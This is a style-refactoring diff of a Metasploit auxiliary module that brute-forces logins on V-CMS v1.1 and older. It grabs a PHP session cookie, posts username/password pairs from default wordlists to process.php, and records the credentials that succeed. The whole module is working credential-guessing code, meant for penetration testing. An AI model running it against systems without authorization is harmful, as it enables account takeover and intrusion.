@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,7 +7,6 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::AuthBrute
@@ -14,40 +14,37 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'V-CMS Login Utility',
-      'Description'    => %q{
-        This module attempts to authenticate to an English-based V-CMS login interface. It
-        should only work against version v1.1 or older, because these versions do not have
-        any default protections against bruteforcing.
-      },
-      'Author'         => [ 'sinn3r' ],
-      'License'        => MSF_LICENSE
-    ))
+                      'Name'           => 'V-CMS Login Utility',
+                      'Description'    => %q(
+                        This module attempts to authenticate to an English-based V-CMS login interface. It
+                        should only work against version v1.1 or older, because these versions do not have
+                        any default protections against bruteforcing.
+                      ),
+                      'Author'         => [ 'sinn3r' ],
+                      'License'        => MSF_LICENSE))
 
     register_options(
       [
-        OptPath.new('USERPASS_FILE',  [ false, "File containing users and passwords separated by space, one pair per line",
-          File.join(Msf::Config.data_directory, "wordlists", "http_default_userpass.txt") ]),
+        OptPath.new('USERPASS_FILE', [ false, "File containing users and passwords separated by space, one pair per line",
+                                       File.join(Msf::Config.data_directory, "wordlists", "http_default_userpass.txt") ]),
         OptPath.new('USER_FILE',  [ false, "File containing users, one per line",
-          File.join(Msf::Config.data_directory, "wordlists", "http_default_users.txt") ]),
+                                    File.join(Msf::Config.data_directory, "wordlists", "http_default_users.txt") ]),
         OptPath.new('PASS_FILE',  [ false, "File containing passwords, one per line",
-          File.join(Msf::Config.data_directory, "wordlists", "http_default_pass.txt") ]),
+                                    File.join(Msf::Config.data_directory, "wordlists", "http_default_pass.txt") ]),
         OptString.new('TARGETURI', [true, 'The URI path to V-CMS', '/vcms2/'])
-      ], self.class)
+      ], self.class
+    )
   end
 
-
   def get_sid
-    res = send_request_raw({
-      'method' => 'GET',
-      'uri'    => @uri
-    })
+    res = send_request_raw('method' => 'GET',
+                           'uri' => @uri)
 
     # Get the PHP session ID
     m = res.get_cookies.match(/(PHPSESSID=.+);/)
-    id = (m.nil?) ? nil : m[1]
+    id = m.nil? ? nil : m[1]
 
-    return id
+    id
   end
 
   def report_cred(opts)
@@ -85,22 +82,18 @@ class MetasploitModule < Msf::Auxiliary
         return :abort
       end
 
-      res = send_request_cgi({
-        'uri'    => "#{@uri}process.php",
-        'method' => 'POST',
-        'cookie' => sid,
-        'vars_post' => {
-          'user'     => user,
-          'pass'     => pass,
-          'sublogin' => '1'
-        }
-      })
+      res = send_request_cgi('uri' => "#{@uri}process.php",
+                             'method' => 'POST',
+                             'cookie' => sid,
+                             'vars_post' => {
+                               'user' => user,
+                               'pass'     => pass,
+                               'sublogin' => '1'
+                             })
       location = res.headers['Location']
-      res = send_request_cgi({
-        'uri' => location,
-        'method' => 'GET',
-        'cookie' => sid
-      })
+      res = send_request_cgi('uri' => location,
+                             'method' => 'GET',
+                             'cookie' => sid)
     rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
       vprint_error("Service failed to respond")
       return :abort
@@ -120,12 +113,12 @@ class MetasploitModule < Msf::Auxiliary
         vprint_status("Username found: #{user}")
       when /\<a href="process\.php\?logout=1"\>/
         print_good("Successful login: \"#{user}:#{pass}\"")
-        report_cred(ip: rhost, port: rport, user:user, password: pass, proof: res.body)
+        report_cred(ip: rhost, port: rport, user: user, password: pass, proof: res.body)
         return :next_user
       end
     end
 
-    return
+    nil
   end
 
   def run
@@ -135,10 +128,10 @@ class MetasploitModule < Msf::Auxiliary
     super
   end
 
-  def run_host(ip)
-    each_user_pass { |user, pass|
+  def run_host(_ip)
+    each_user_pass do |user, pass|
       vprint_status("Trying \"#{user}:#{pass}\"")
       do_login(user, pass)
-    }
+    end
   end
 end
